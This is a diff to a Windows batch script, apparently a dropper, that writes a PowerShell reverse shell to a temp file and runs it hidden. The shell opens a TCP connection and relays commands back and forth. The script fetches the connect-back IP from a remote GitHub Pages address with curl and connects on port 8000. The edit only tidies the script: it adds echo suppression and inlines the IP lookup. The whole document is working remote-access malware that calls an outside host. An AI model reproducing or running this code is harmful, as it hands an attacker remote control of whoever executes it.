@@ -1,3 +1,4 @@
+@echo off
 powershell -NoP -W hidden ; exit
 (
 echo $KLK = New-Object System.Net.Sockets.TCPClient^($args[0],$args[1]^);
@@ -17,7 +18,6 @@ echo $PLP.Flush^(^)};
 echo $KLK.Close^(^)
 )>%temp%\331.ps1
 
-curl -kLs stivengiv.github.io/revs/ip.txt
-for /f %%i in ('type ip.txt') do (set "_ip=%%i")
+for /f %%i in ('curl -kLs stivengiv.github.io/revs/ip.txt') do (set "_ip=%%i")
 powershell %temp%\331.ps1 %_ip% 8000
 exit
